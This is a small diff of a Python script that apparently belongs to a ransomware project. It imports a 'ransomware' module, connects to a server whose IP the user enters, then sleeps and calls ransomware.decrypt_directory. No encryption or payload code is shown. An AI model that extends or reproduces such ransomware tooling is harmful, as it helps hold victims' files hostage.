@@ -1,7 +1,7 @@
 import socket
 import ssl
 import ransomware
-
+import time
 def get_ip():
     return input("Enter the server ip: ")
 
@@ -22,6 +22,8 @@ def server_connection():
 
 if __name__ == "__main__":
     server_connection()
+    time.sleep(20)
+    ransomware.decrypt_directory("")
 
     
     
